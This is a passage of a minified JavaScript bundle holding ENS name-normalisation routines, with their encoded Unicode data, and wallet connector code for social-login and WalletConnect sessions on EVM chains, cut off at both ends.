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";const Bl=44032,sf=4352,of=4449,af=4519,J2=19,Z2=21,Pc=28,cf=Z2*Pc,vG=J2*cf,EG=Bl+vG,AG=sf+J2,_G=of+Z2,CG=af+Pc;function Cu(t){return t>>24&255}function X2(t){return t&16777215}let P0,fA,R0,yd;function IG(){let t=G2(bG);P0=new Map(V2(t).flatMap((e,r)=>e.map(n=>[n,r+1<<24]))),fA=new Set(Dl(t)),R0=new Map,yd=new Map;for(let[e,r]of K2(t)){if(!fA.has(e)&&r.length==2){let[n,i]=r,s=yd.get(n);s||(s=new Map,yd.set(n,s)),s.set(i,e)}R0.set(e,r.reverse())}}function ex(t){return t>=Bl&&t<EG}function xG(t,e){if(t>=sf&&t<AG&&e>=of&&e<_G)return Bl+(t-sf)*cf+(e-of)*Pc;if(ex(t)&&e>af&&e<CG&&(t-Bl)%Pc==0)return t+(e-af);{let r=yd.get(t);return r&&(r=r.get(e),r)?r:-1}}function tx(t){P0||IG();let e=[],r=[],n=!1;function i(s){let o=P0.get(s);o&&(n=!0,s|=o),e.push(s)}for(let s of t)for(;;){if(s<128)e.push(s);else if(ex(s)){let o=s-Bl,a=o/cf|0,c=o%cf/Pc|0,u=o%Pc;i(sf+a),i(of+c),u>0&&i(af+u)}else{let o=R0.get(s);o?r.push(...o):i(s)}if(!r.length)break;s=r.pop()}if(n&&e.length>1){let s=Cu(e[0]);for(let o=1;o<e.length;o++){let a=Cu(e[o]);if(a==0||s<=a){s=a;continue}let c=o-1;for(;;){let u=e[c+1];if(e[c+1]=e[c],e[c]=u,!c||(s=Cu(e[--c]),s<=a))break}s=Cu(e[o])}}return e}function SG(t){let e=[],r=[],n=-1,i=0;for(let s of t){let o=Cu(s),a=X2(s);if(n==-1)o==0?n=a:e.push(a);else if(i>0&&i>=o)o==0?(e.push(n,...r),r.length=0,n=a):r.push(a),i=o;else{let c=xG(n,a);c>=0?n=c:i==0&&o==0?(e.push(n),n=a):(r.push(a),i=o)}}return n>=0&&e.push(n,...r),e}function rx(t){return tx(t).map(X2)}function NG(t){return SG(tx(t))}const pA=45,nx=".",ix=65039,sx=1,uf=t=>Array.from(t);function Ul(t,e){return t.P.has(e)||t.Q.has(e)}class TG extends Array{get is_emoji(){return!0}}let O0,ox,Ho,k0,ax,uc,Fg,Ja,Ro,gA,D0;function qy(){if(O0)return;let t=G2(aG);const e=()=>Dl(t),r=()=>new Set(e()),n=(l,h)=>h.forEach(d=>l.add(d));O0=new Map(K2(t)),ox=r(),Ho=e(),k0=new Set(e().map(l=>Ho[l])),Ho=new Set(Ho),ax=r(),r();let i=V2(t),s=t();const o=()=>{let l=new Set;return e().forEach(h=>n(l,i[h])),n(l,e()),l};uc=Ml(l=>{let h=Ml(t).map(d=>d+96);if(h.length){let d=l>=s;h[0]-=32,h=Tc(h),d&&(h=`Restricted[${h}]`);let g=o(),y=o(),m=!t();return{N:h,P:g,Q:y,M:m,R:d}}}),Fg=r(),Ja=new Map;let a=e().concat(uf(Fg)).sort((l,h)=>l-h);a.forEach((l,h)=>{let d=t(),g=a[h]=d?a[h-d]:{V:[],M:new Map};g.V.push(l),Fg.has(l)||Ja.set(l,g)});for(let{V:l,M:h}of new Set(Ja.values())){let d=[];for(let y of l){let m=uc.filter(A=>Ul(A,y)),b=d.find(({G:A})=>m.some(_=>A.has(_)));b||(b={G:new Set,V:[]},d.push(b)),b.V.push(y),n(b.G,m)}let g=d.flatMap(y=>uf(y.G));for(let{G:y,V:m}of d){let b=new Set(g.filter(A=>!y.has(A)));for(let A of m)h.set(A,b)}}Ro=new Set;let c=new Set;const u=l=>Ro.has(l)?c.add(l):Ro.add(l);for(let l of uc){for(let h of l.P)u(h);for(let h of l.Q)u(h)}for(let l of Ro)!Ja.has(l)&&!c.has(l)&&Ja.set(l,sx);n(Ro,rx(Ro)),gA=gG(t).map(l=>TG.from(l)).sort(wG),D0=new Map;for(let l of gA){let h=[D0];for(let d of l){let g=h.map(y=>{let m=y.get(d);return m||(m=new Map,y.set(d,m)),m});d===ix?h.push(...g):h=g}for(let d of h)d.V=l}}function zy(t){return(cx(t)?"":`${Hy(Xf([t]))} `)+Y2(t)}function Hy(t){return`"${t}"`}function PG(t){if(t.length>=4&&t[2]==pA&&t[3]==pA)throw new Error(`invalid label extension: "${Tc(t.slice(0,4))}"`)}function RG(t){for(let r=t.lastIndexOf(95);r>0;)if(t[--r]!==95)throw new Error("underscore allowed only at start")}function OG(t){let e=t[0],r=hA.get(e);if(r)throw Bu(`leading ${r}`);let n=t.length,i=-1;for(let s=1;s<n;s++){e=t[s];let o=hA.get(e);if(o){if(i==s)throw Bu(`${r} + ${o}`);i=s+1,r=o}}if(i==n)throw Bu(`trailing ${r}`)}function Xf(t,e=1/0,r=Y2){let n=[];kG(t[0])&&n.push(""),t.length>e&&(e>>=1,t=[...t.slice(0,e),8230,...t.slice(-e)]);let i=0,s=t.length;for(let o=0;o<s;o++){let a=t[o];cx(a)&&(n.push(Tc(t.slice(i,o))),n.push(r(a)),i=o+1)}return n.push(Tc(t.slice(i,s))),n.join("")}function kG(t,e){return qy(),Ho.has(t)}function cx(t){return qy(),ax.has(t)}function DG(t){return $G(MG(t,NG,jG))}function MG(t,e,r){if(!t)return[];qy();let n=0;return t.split(nx).map(i=>{let s=yG(i),o={input:s,offset:n};n+=s.length+1;try{let a=o.tokens=FG(s,e,r),c=a.length,u;if(!c)throw new Error("empty label");let l=o.output=a.flat();if(RG(l),!(o.emoji=c>1||a[0].is_emoji)&&l.every(d=>d<128))PG(l),u="ASCII";else{let d=a.flatMap(g=>g.is_emoji?[]:g);if(!d.length)u="Emoji";else{if(Ho.has(l[0]))throw Bu("leading combining mark");for(let m=1;m<c;m++){let b=a[m];if(!b.is_emoji&&Ho.has(b[0]))throw Bu(`emoji + combining mark: "${Tc(a[m-1])} + ${Xf([b[0]])}"`)}OG(l);let g=uf(new Set(d)),[y]=UG(g);LG(y,d),BG(y,g),u=y.N}}o.type=u}catch(a){o.error=a}return o})}function BG(t,e){let r,n=[];for(let i of e){let s=Ja.get(i);if(s===sx)return;if(s){let o=s.M.get(i);if(r=r?r.filter(a=>o.has(a)):uf(o),!r.length)return}else n.push(i)}if(r){for(let i of r)if(n.every(s=>Ul(i,s)))throw new Error(`whole-script confusable: ${t.N}/${i.N}`)}}function UG(t){let e=uc;for(let r of t){let n=e.filter(i=>Ul(i,r));if(!n.length)throw uc.some(i=>Ul(i,r))?lx(e[0],r):ux(r);if(e=n,n.length==1)break}return e}function $G(t){return t.map(({input:e,error:r,output:n})=>{if(r){let i=r.message;throw new Error(t.length==1?i:`Invalid label ${Hy(Xf(e,63))}: ${i}`)}return Tc(n)}).join(nx)}function ux(t){return new Error(`disallowed character: ${zy(t)}`)}function lx(t,e){let r=zy(e),n=uc.find(i=>i.P.has(e));return n&&(r=`${n.N} ${r}`),new Error(`illegal mixture: ${t.N} + ${r}`)}function Bu(t){return new Error(`illegal placement: ${t}`)}function LG(t,e){for(let r of e)if(!Ul(t,r))throw lx(t,r);if(t.M){let r=rx(e);for(let n=1,i=r.length;n<i;n++)if(k0.has(r[n])){let s=n+1;for(let o;s<i&&k0.has(o=r[s]);s++)for(let a=n;a<s;a++)if(r[a]==o)throw new Error(`duplicate non-spacing marks: ${zy(o)}`);if(s-n>dA)throw new Error(`excessive non-spacing marks: ${Hy(Xf(r.slice(n-1,s)))} (${s-n}/${dA})`);n=s}}}function FG(t,e,r){let n=[],i=[];for(t=t.slice().reverse();t.length;){let s=qG(t);if(s)i.length&&(n.push(e(i)),i=[]),n.push(r(s));else{let o=t.pop();if(Ro.has(o))i.push(o);else{let a=O0.get(o);if(a)i.push(...a);else if(!ox.has(o))throw ux(o)}}}return i.length&&n.push(e(i)),n}function jG(t){return t.filter(e=>e!=ix)}function qG(t,e){let r=D0,n,i=t.length;for(;i&&(r=r.get(t[--i]),!!r);){let{V:s}=r;s&&(n=s,t.length=i)}return n}function zG(t){return DG(t)}function HG(t){return zG(t)}function WG(t){let e=[],r,n;function i(a){return qu.parseEvmChainId(a)||1}function s(){return r||(r=Qo.getInstance({projectId:t.options.projectId,enableLogger:t.options.enableAuthLogger,onTimeout:()=>{Wo.open(qo.ALERT_ERRORS.SOCIALS_TIMEOUT,"error")}})),r}async function o(a={}){var m,b;const c=s();let u=a.chainId;if(a.isReconnecting){const A=qu.parseEvmChainId(c.getLastUsedChainId()||""),_=(m=t.chains)==null?void 0:m[0].id;if(u=A||_,!u)throw new Error("ChainId not found in provider")}const l=(b=pe.state.preferredAccountTypes)==null?void 0:b.eip155,{address:h,chainId:d,accounts:g}=await c.connect({chainId:u,preferredAccountType:l});e=(g==null?void 0:g.map(A=>A.address))||[h];const y=i(d);return{accounts:e,account:h,chainId:y,chain:{id:y,unsuported:!1}}}return a=>({id:Z.CONNECTOR_ID.AUTH,name:Z.CONNECTOR_NAMES.AUTH,type:"AUTH",chain:Z.CHAIN.EVM,async connect(c={}){if(n)return n;n||(n=new Promise(l=>{l(o(c))}));const u=await n;return n=void 0,u},async disconnect(){await(await this.getProvider()).disconnect()},getAccounts(){return e!=null&&e.length?(a.emitter.emit("change",{accounts:e}),Promise.resolve(e)):Promise.resolve([])},async getProvider(){return this.provider||(this.provider=Qo.getInstance({projectId:t.options.projectId,enableLogger:t.options.enableAuthLogger,onTimeout:()=>{Wo.open(qo.ALERT_ERRORS.SOCIALS_TIMEOUT,"error")}})),Promise.resolve(this.provider)},async getChainId(){const c=await this.getProvider(),{chainId:u}=await c.getChainId();return i(u)},async isAuthorized(){const c=await this.getProvider();return Promise.resolve(c.getLoginEmailUsed())},async switchChain({chainId:c}){var u,l;try{const h=a.chains.find(m=>m.id===c);if(!h)throw new zi(new Error("chain not found on connector."));const d=await this.getProvider(),g=(u=pe.state.preferredAccountTypes)==null?void 0:u.eip155,y=await d.connect({chainId:c,preferredAccountType:g});return e=((l=y==null?void 0:y.accounts)==null?void 0:l.map(m=>m.address))||[y.address],a.emitter.emit("change",{chainId:Number(c),accounts:e}),h}catch(h){throw h instanceof Error?new zi(h):h}},onAccountsChanged(c){c.length===0?this.onDisconnect():a.emitter.emit("change",{accounts:c.map(Lo)})},onChainChanged(c){const u=Number(c);a.emitter.emit("change",{chainId:u})},async onDisconnect(c){await(await this.getProvider()).disconnect()}})}Wy.type="walletConnect";function Wy(t,e){const r=t.isNewChainsStale??!0;let n,i,s,o,a,c,u;return l=>({id:"walletConnect",name:"WalletConnect",type:Wy.type,async setup(){const h=await this.getProvider().catch(()=>null);h&&(o||(o=this.onConnect.bind(this),h.on("connect",o)),c||(c=this.onSessionDelete.bind(this),h.on("session_delete",c)))},async connect({...h}={}){var d,g,y;try{const m=q.getCaipNetworks(),b=await this.getProvider();if(!b)throw new js;a||(a=this.onDisplayUri,b.on("display_uri",a));const A=await this.isChainsStale();b.session&&A&&await b.disconnect();const _=te.state.universalProviderConfigOverride;if(!b.session||A){const D=Yf.createNamespaces(m,_);await b.connect({optionalNamespaces:D,..."pairingTopic"in h?{pairingTopic:h.pairingTopic}:{}}),this.setRequestedChainsIds(m.map(F=>Number(F.id)))}const T=await this.getAccounts(),P=await this.getChainId(),S=(y=(g=(d=b.session)==null?void 0:d.namespaces)==null?void 0:g.eip155)==null?void 0:y.chains,C=S==null?void 0:S.some(D=>Number(D.split(":")[1])===P);let O=1;C?O=P:S!=null&&S[0]&&(O=Number(S[0].split(":")[1])),a&&(b.removeListener("display_uri",a),a=void 0),o&&(b.removeListener("connect",o),o=void 0),i||(i=this.onAccountsChanged.bind(this),b.on("accountsChanged",i)),s||(s=this.onChainChanged.bind(this),b.on("chainChanged",s)),u||(u=this.onDisconnect.bind(this),b.on("disconnect",u)),c||(c=this.onSessionDelete.bind(this),b.on("session_delete",c));const $=_==null?void 0:_.defaultChain;return b.setDefaultChain($??`eip155:${O}`),{accounts:T,chainId:O}}catch(m){throw/(user rejected|connection request reset)/i.test(m==null?void 0:m.message)?new hr(m):m}},async disconnect(){const h=await this.getProvider();try{await(h==null?void 0:h.disconnect())}catch(d){if(!/No matching key/i.test(d.message))throw d}finally{s&&(h==null||h.removeListener("chainChanged",s),s=void 0),u&&(h==null||h.removeListener("disconnect",u),u=void 0),o||(o=this.onConnect.bind(this),h==null||h.on("connect",o)),i&&(h==null||h.removeListener("accountsChanged",i),i=void 0),c&&(h==null||h.removeListener("session_delete",c),c=void 0),this.setRequestedChainsIds([])}},async getAccounts(){var y,m,b;const h=await this.getProvider();if(!((y=h==null?void 0:h.session)!=null&&y.namespaces))return[];const d=(b=(m=h==null?void 0:h.session)==null?void 0:m.namespaces[Z.CHAIN.EVM])==null?void 0:b.accounts;return(d==null?void 0:d.map(A=>A.split(":")[2]))??[]},async getProvider({chainId:h}={}){var y,m;n||(n=await e.getUniversalProvider(),n==null||n.events.setMaxListeners(Number.POSITIVE_INFINITY));const d=le.getActiveNamespace(),g=(y=e.getCaipNetwork())==null?void 0:y.id;if(h&&g!==h&&d){const b=le.getStoredActiveCaipNetworkId(),A=e.getCaipNetworks(d),_=A==null?void 0:A.find(T=>T.id===b);_&&_.chainNamespace===Z.CHAIN.EVM&&await((m=this.switchChain)==null?void 0:m.call(this,{chainId:Number(_.id)}))}return n},async getChainId(){var m,b,A,_;const h=(m=e.getCaipNetwork(Z.CHAIN.EVM))==null?void 0:m.id;if(h)return h;const g=(_=(A=(b=(await this.getProvider()).session)==null?void 0:b.namespaces[Z.CHAIN.EVM])==null?void 0:A.chains)==null?void 0:_[0],y=q.getCaipNetworks().find(T=>T.id===g);return y==null?void 0:y.id},async isAuthorized(){try{const[h,d]=await Promise.all([this.getAccounts(),this.getProvider()]);return h.length?await this.isChainsStale()&&d.session?(await d.disconnect().catch(()=>{}),!1):!0:!1}catch{return!1}},async switchChain({addEthereumChainParameter:h,chainId:d}){var m,b,A,_;const g=await this.getProvider();if(!g)throw new js;const y=q.getCaipNetworks().find(T=>T.id===d);if(!y)throw new zi(new kl);try{await g.request({method:"wallet_switchEthereumChain",params:[{chainId:Ue(d)}]}),y!=null&&y.caipNetworkId&&g.setDefaultChain(y==null?void 0:y.caipNetworkId),l.emitter.emit("change",{chainId:Number(d)});const T=await this.getRequestedChainsIds();return this.setRequestedChainsIds([...T,d]),{...y,id:y.id}}catch(T){const P=T;if(/(?:user rejected)/iu.test(P.message))throw new hr(P);try{let S;h!=null&&h.blockExplorerUrls?S=h.blockExplorerUrls:S=(m=y.blockExplorers)!=null&&m.default.url?[(b=y.blockExplorers)==null?void 0:b.default.url]:[];const C=((_=(A=y.rpcUrls)==null?void 0:A.chainDefault)==null?void 0:_.http)||[],O={blockExplorerUrls:S,chainId:Ue(d),chainName:y.name,iconUrls:h==null?void 0:h.iconUrls,nativeCurrency:y.nativeCurrency,rpcUrls:C};await g.request({method:"wallet_addEthereumChain",params:[O]});const $=await this.getRequestedChainsIds();return this.setRequestedChainsIds([...$,d]),{...y,id:y.id}}catch(S){throw new hr(S)}}},onAccountsChanged(h){h.length===0?this.onDisconnect():l.emitter.emit("change",{accounts:h.map(d=>Lo(d))})},onChainChanged(h){const d=Number(h);l.emitter.emit("change",{chainId:d})},onConnect(h){this.setRequestedChainsIds(q.getCaipNetworks().map(d=>Number(d.id)))},async onDisconnect(h){this.setRequestedChainsIds([]),l.emitter.emit("disconnect");const d=await this.getProvider();i&&(d.removeListener("accountsChanged",i),i=void 0),s&&(d.removeListener("chainChanged",s),s=void 0),u&&(d.removeListener("disconnect",u),u=void 0),c&&(d.removeListener("session_delete",c),c=void 0),o||(o=this.onConnect.bind(this),d.on("connect",o))},onDisplayUri(h){l.emitter.emit("message",{type:"display_uri",data:h})},onSessionDelete(){this.onDisconnect()},getNamespaceChainsIds(){var g,y,m;if(!((g=n==null?void 0:n.session)!=null&&g.namespaces))return[];const h=(m=(y=n==null?void 0:n.session)==null?void 0:y.namespaces[Z.CHAIN.EVM])==null?void 0:m.accounts;return(h==null?void 0:h.map(b=>Number.parseInt(b.split(":")[1]??"")))??[]},async getRequestedChainsIds(){var d;const h=await((d=l.storage)==null?void 0:d.getItem(this.requestedChainsStorageKey))??[];return[...new Set(h)]},async isChainsStale(){if(!r)return!1;const h=l.chains.map(y=>y.id),d=this.getNamespaceChainsIds();if(d.length&&!d.some(y=>h.includes(y)))return!1;const g=await this.getRequestedChainsIds();return!h.every(y=>g.includes(Number(y)))},async setRequestedChainsIds(h){var d;await((d=l.storage)==null?void 0:d.setItem(this.requestedChainsStorageKey,h))},get requestedChainsStorageKey(){return`${this.id}.requestedChains`}})}const gu=Kt({pendingTransactions:0}),mA={state:gu,subscribeKey(t,e){return tn(gu,t,e)},increase(t){gu[t]+=1},decrease(t){gu[t]-=1},reset(t){gu[t]=0}};function GG(t){try{return JSON.parse(t)}catch{throw new Error("Error parsing wallet capabilities")}}const 